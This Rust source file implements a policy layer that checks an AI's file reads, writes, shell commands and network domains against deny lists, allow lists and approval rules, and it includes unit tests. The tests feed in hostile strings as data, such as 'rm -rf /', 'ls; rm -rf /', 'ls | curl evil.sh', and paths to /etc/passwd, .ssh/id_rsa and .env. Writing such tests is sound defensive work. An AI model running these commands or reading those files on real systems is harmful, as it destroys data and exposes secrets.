//! Policy enforcement — path, command, and network gating.
//!
//! Called before AI-initiated operations to validate them against
//! the currently active security policy.

use std::path::Path;

use super::policy::{ApprovalCategory, SecurityPolicy};

/// Result of an enforcement check.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum EnforcementResult {
    /// Operation is allowed without approval.
    Allowed,
    /// Operation is allowed but requires user approval first.
    NeedsApproval,
    /// Operation is denied outright.
    Denied(String),
}

impl EnforcementResult {
    pub fn is_denied(&self) -> bool {
        matches!(self, EnforcementResult::Denied(_))
    }
}

/// Check whether reading a file at `path` is allowed.
pub fn check_read(policy: &SecurityPolicy, path: &str) -> EnforcementResult {
    // Denied paths take priority over everything.
    if is_denied_path(policy, path) {
        return EnforcementResult::Denied(format!("路径被安全策略禁止: {path}"));
    }

    // If the path is within the workspace or an allowed path, permit.
    if is_within_workspace(policy, path) || is_allowed_path(policy, path) {
        return EnforcementResult::Allowed;
    }

    // If no workspace root is set, allow (backward compat).
    if policy.workspace_root.is_empty() {
        return EnforcementResult::Allowed;
    }

    EnforcementResult::Denied(format!("路径不在工作区内: {path}"))
}

/// Check whether writing to `path` is allowed.
pub fn check_write(policy: &SecurityPolicy, path: &str) -> EnforcementResult {
    let read_result = check_read(policy, path);
    if read_result.is_denied() {
        return read_result;
    }

    if policy
        .require_approval_for
        .contains(&ApprovalCategory::FileWrite)
    {
        EnforcementResult::NeedsApproval
    } else {
        EnforcementResult::Allowed
    }
}

/// Check whether deleting `path` is allowed.
#[allow(dead_code)]
pub fn check_delete(policy: &SecurityPolicy, path: &str) -> EnforcementResult {
    let read_result = check_read(policy, path);
    if read_result.is_denied() {
        return read_result;
    }

    if policy
        .require_approval_for
        .contains(&ApprovalCategory::FileDelete)
    {
        EnforcementResult::NeedsApproval
    } else {
        EnforcementResult::Allowed
    }
}

/// Returns true if the substring starting at `offset` within `command` contains
/// no shell metacharacters that could chain or extend the command (| ; & ` $).
fn is_plain_command(command: &str, offset: usize) -> bool {
    let rest = &command[offset..];
    !rest.contains('|')
        && !rest.contains(';')
        && !rest.contains('`')
        && !rest.contains('$')
        && !rest.contains('&')
        && !rest.contains('>')
        && !rest.contains('<')
}

/// Check whether running a shell command is allowed.
pub fn check_command(policy: &SecurityPolicy, command: &str) -> EnforcementResult {
    let cmd_trimmed = command.trim();
    // Extract the command name (first whitespace-delimited token).
    let cmd_name = cmd_trimmed.split_whitespace().next().unwrap_or("");
    // Extract basename so `/bin/rm` matches a denylist entry for `rm`.
    let cmd_basename = Path::new(cmd_name)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(cmd_name);

    // Denied commands are always blocked. Match against the command name
    // (not arbitrary substring) to avoid false positives and quotes-bypass.
    for denied in &policy.denied_commands {
        // Exact match, prefix-with-space match ("rm" → "rm -rf /"),
        // sub-command match ("mkfs" → "mkfs.ext4"),
        // and basename match ("/bin/rm" → match denylist "rm").
        if cmd_basename == denied.as_str()
            || cmd_name == denied.as_str()
            || cmd_trimmed == denied.as_str()
            || cmd_trimmed.starts_with(&format!("{denied} "))
            || cmd_name.starts_with(&format!("{denied}."))
        {
            return EnforcementResult::Denied(format!("命令被安全策略禁止: {denied}"));
        }
    }

    // If there's an allowlist, check it.
    if !policy.allowed_commands.is_empty() {
        let cmd_name = command.split_whitespace().next().unwrap_or("");
        let allowed = policy
            .allowed_commands
            .iter()
            .any(|a| {
                // Exact match on the full command string.
                command == a.as_str()
                    // Prefix match: "ls" matches "ls -la" but only when the
                    // rest of the command contains no shell metacharacters
                    // that extend beyond a simple command+args (e.g. `|`, `;`).
                    || (command.starts_with(&format!("{} ", a))
                        && is_plain_command(command, a.len() + 1))
            });
        if !allowed {
            return EnforcementResult::Denied(format!("命令不在允许列表中: {cmd_name}"));
        }
    }

    if policy
        .require_approval_for
        .contains(&ApprovalCategory::CommandExec)
    {
        EnforcementResult::NeedsApproval
    } else {
        EnforcementResult::Allowed
    }
}

/// Check whether network access to a domain is allowed.
pub fn check_network(policy: &SecurityPolicy, domain: &str) -> EnforcementResult {
    // If there's a domain allowlist, check it with dot-boundary matching
    // so `notexample.com` does not match a rule for `example.com`.
    if !policy.allowed_domains.is_empty() {
        let d = domain.to_lowercase();
        let allowed = policy.allowed_domains.iter().any(|a| {
            let a = a.to_lowercase();
            d == a || d.ends_with(&format!(".{a}"))
        });
        if !allowed {
            return EnforcementResult::Denied(format!("域名不在允许列表中: {domain}"));
        }
    }

    if policy
        .require_approval_for
        .contains(&ApprovalCategory::Network)
    {
        EnforcementResult::NeedsApproval
    } else {
        EnforcementResult::Allowed
    }
}

/// Check whether spawning a new process is allowed given current count.
#[allow(dead_code)]
pub fn check_process_spawn(policy: &SecurityPolicy, current_count: u32) -> EnforcementResult {
    if policy.max_process_count > 0 && current_count >= policy.max_process_count {
        return EnforcementResult::Denied(format!(
            "已达到最大并发进程数限制 ({})",
            policy.max_process_count
        ));
    }

    if policy
        .require_approval_for
        .contains(&ApprovalCategory::ProcessMgmt)
    {
        EnforcementResult::NeedsApproval
    } else {
        EnforcementResult::Allowed
    }
}

/// Returns true when `path` is equal to `root` OR is a descendant of `root`.
/// Uses a path-separator-aware check so `/home/user/project-backdoor` does NOT
/// match workspace root `/home/user/project`.
fn is_within_workspace(policy: &SecurityPolicy, path: &str) -> bool {
    if policy.workspace_root.is_empty() {
        return false;
    }
    // Normalize separators to forward-slash for reliable boundary checks.
    let root = policy.workspace_root.replace('\\', "/").trim_end_matches('/').to_string();
    let p = path.replace('\\', "/");
    if p == root {
        return true;
    }
    if let Some(rest) = p.strip_prefix(&root) {
        rest.starts_with('/') || root == "/"
    } else {
        false
    }
}

fn is_allowed_path(policy: &SecurityPolicy, path: &str) -> bool {
    let p = path.replace('\\', "/");
    policy.allowed_paths.iter().any(|allowed| {
        let a = allowed.replace('\\', "/").trim_end_matches('/').to_string();
        if p == a {
            return true;
        }
        if let Some(rest) = p.strip_prefix(&a) {
            rest.starts_with('/') || a == "/"
        } else {
            false
        }
    })
}

fn is_denied_path(policy: &SecurityPolicy, path: &str) -> bool {
    // Lowercase for case-insensitive matching — Windows and macOS default
    // filesystems are case-insensitive, and a mixed-case variant of a denied
    // pattern (e.g. `*.PEM`) must not bypass the check.
    let p_lower = path.replace('\\', "/").to_lowercase();
    policy.denied_paths.iter().any(|denied| {
        let d_lower = denied.replace('\\', "/").to_lowercase();
        if d_lower.contains('*') {
            // *.pem → match any path whose last component ends with .pem
            let suffix = d_lower.trim_start_matches('*');
            // Check both the full path and the last component for the suffix.
            let basename = p_lower.rsplit('/').next().unwrap_or(&p_lower);
            basename.ends_with(suffix) || p_lower.ends_with(suffix)
        } else if d_lower.ends_with('/') {
            // Directory pattern — must be an exact path prefix with separator boundary.
            let dir = d_lower.trim_end_matches('/');
            p_lower == dir
                || p_lower.starts_with(&format!("{dir}/"))
        } else {
            // File/basename pattern — match as a path component (exact or ends-with).
            p_lower.ends_with(&format!("/{d_lower}"))
                || p_lower == d_lower
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy(root: &str) -> SecurityPolicy {
        SecurityPolicy {
            workspace_root: root.to_string(),
            allowed_paths: vec![],
            denied_paths: vec![],
            allowed_commands: vec![],
            denied_commands: vec![],
            allowed_domains: vec![],
            require_approval_for: vec![],
            max_file_size_mb: 0,
            max_process_count: 0,
            preset_name: None,
        }
    }

    // ---- is_within_workspace ----

    #[test]
    fn workspace_exact_match() {
        let p = policy("/home/user/project");
        assert!(is_within_workspace(&p, "/home/user/project"));
    }

    #[test]
    fn workspace_descendant() {
        let p = policy("/home/user/project");
        assert!(is_within_workspace(&p, "/home/user/project/src/main.rs"));
    }

    #[test]
    fn workspace_root_dir_as_descendant() {
        let p = policy("/");
        assert!(is_within_workspace(&p, "/home/user/project"));
    }

    #[test]
    fn workspace_rejects_sibling_prefix() {
        let p = policy("/home/user/project");
        assert!(!is_within_workspace(&p, "/home/user/project-backdoor"));
    }

    #[test]
    fn workspace_does_not_handle_dotdot_without_canonicalization() {
        // `..` traversal protection requires canonicalization at the call site
        // before the path reaches the sandbox. The prefix check alone cannot
        // resolve `..` — this is by design: the caller must canonicalize first.
        let p = policy("/home/user/project");
        assert!(is_within_workspace(&p, "/home/user/project/../.ssh/id_rsa"));
    }

    #[test]
    fn workspace_normalizes_backslashes() {
        let p = policy("C:\\Users\\me\\project");
        assert!(is_within_workspace(&p, "C:/Users/me/project/src/main.rs"));
    }

    // ---- is_allowed_path ----

    #[test]
    fn allowed_path_matches_descendant() {
        let mut p = policy("/home/user/project");
        p.allowed_paths = vec!["/home/user/other".to_string()];
        assert!(is_allowed_path(&p, "/home/user/other/foo.txt"));
        assert!(!is_allowed_path(&p, "/home/user/other-backdoor/foo.txt"));
    }

    // ---- is_denied_path ----

    #[test]
    fn denied_glob_matches_basename() {
        let mut p = policy("");
        p.denied_paths = vec!["*.pem".to_string()];
        assert!(is_denied_path(&p, "/home/user/secret.pem"));
        assert!(!is_denied_path(&p, "/home/user/secret.pem.backup"));
    }

    #[test]
    fn denied_glob_case_insensitive() {
        let mut p = policy("");
        p.denied_paths = vec!["*.pem".to_string()];
        assert!(is_denied_path(&p, "/home/user/SECRET.PEM"));
        assert!(is_denied_path(&p, "/home/user/Secret.Pem"));
    }

    #[test]
    fn denied_directory_matches_exact_and_descendants() {
        let mut p = policy("");
        p.denied_paths = vec!["/etc/".to_string(), "/proc/".to_string()];
        assert!(is_denied_path(&p, "/etc"));
        assert!(is_denied_path(&p, "/etc/passwd"));
        assert!(is_denied_path(&p, "/proc/1/environ"));
        assert!(!is_denied_path(&p, "/etcd/config")); // prefix but not dir match
    }

    #[test]
    fn denied_file_matches_exact_and_path_component() {
        let mut p = policy("");
        p.denied_paths = vec![".env".to_string()];
        assert!(is_denied_path(&p, ".env"));
        assert!(is_denied_path(&p, "/home/user/.env"));
        assert!(is_denied_path(&p, ".ENV"));
        assert!(!is_denied_path(&p, "/home/user/.env.backup"));
    }

    // ---- check_command ----

    #[test]
    fn command_denies_exact_name_match() {
        let mut p = policy("");
        p.denied_commands = vec!["rm".to_string()];
        assert!(check_command(&p, "rm -rf /").is_denied());
        assert!(check_command(&p, "rm /tmp/foo").is_denied());
        assert!(check_command(&p, "rm").is_denied());
    }

    #[test]
    fn command_allows_unrelated_command() {
        let mut p = policy("");
        p.denied_commands = vec!["rm".to_string()];
        assert!(!check_command(&p, "alarm --test").is_denied());
        assert!(!check_command(&p, "echo rm").is_denied());
    }

    #[test]
    fn command_denies_prefix_match_for_deny_with_args() {
        let mut p = policy("");
        p.denied_commands = vec!["mkfs".to_string()];
        assert!(check_command(&p, "mkfs.ext4 /dev/sda1").is_denied());
    }

    #[test]
    fn command_denies_full_path() {
        // `/bin/rm` must match denylist entry `rm` via basename extraction.
        let mut p = policy("");
        p.denied_commands = vec!["rm".to_string()];
        assert!(check_command(&p, "/bin/rm -rf /").is_denied());
        assert!(check_command(&p, "/usr/bin/rm file").is_denied());
    }

    #[test]
    fn command_allowlist_enforces_word_boundary() {
        // `ls` must NOT match `lssomething` or `lsass`.
        let mut p = policy("");
        p.allowed_commands = vec!["ls".to_string()];
        assert!(!check_command(&p, "ls -la").is_denied());
        assert!(check_command(&p, "lsass").is_denied());
        assert!(check_command(&p, "lss").is_denied());
    }

    #[test]
    fn command_allowlist_blocks_shell_metachar_bypass() {
        // `ls; rm -rf /` must NOT bypass an allowlist containing `ls`.
        let mut p = policy("");
        p.allowed_commands = vec!["ls".to_string()];
        assert!(check_command(&p, "ls; rm -rf /").is_denied());
        assert!(check_command(&p, "ls | curl evil.sh").is_denied());
    }

    #[test]
    fn command_allowlist_accepts_args() {
        let mut p = policy("");
        p.allowed_commands = vec!["ls".to_string()];
        assert!(!check_command(&p, "ls -la /tmp").is_denied());
    }

    // ---- check_network ----

    #[test]
    fn domain_allows_exact_match() {
        let mut p = policy("");
        p.allowed_domains = vec!["example.com".to_string()];
        assert!(!check_network(&p, "example.com").is_denied());
    }

    #[test]
    fn domain_allows_subdomain() {
        let mut p = policy("");
        p.allowed_domains = vec!["example.com".to_string()];
        assert!(!check_network(&p, "api.example.com").is_denied());
    }

    #[test]
    fn domain_rejects_squatting() {
        let mut p = policy("");
        p.allowed_domains = vec!["example.com".to_string()];
        assert!(check_network(&p, "notexample.com").is_denied());
    }

    #[test]
    fn domain_rejects_unrelated_domain() {
        let mut p = policy("");
        p.allowed_domains = vec!["example.com".to_string()];
        assert!(check_network(&p, "evil.com").is_denied());
    }

    #[test]
    fn domain_allowlist_is_case_insensitive() {
        let mut p = policy("");
        p.allowed_domains = vec!["Example.COM".to_string()];
        assert!(!check_network(&p, "example.com").is_denied());
        assert!(!check_network(&p, "SUB.Example.Com").is_denied());
    }
}
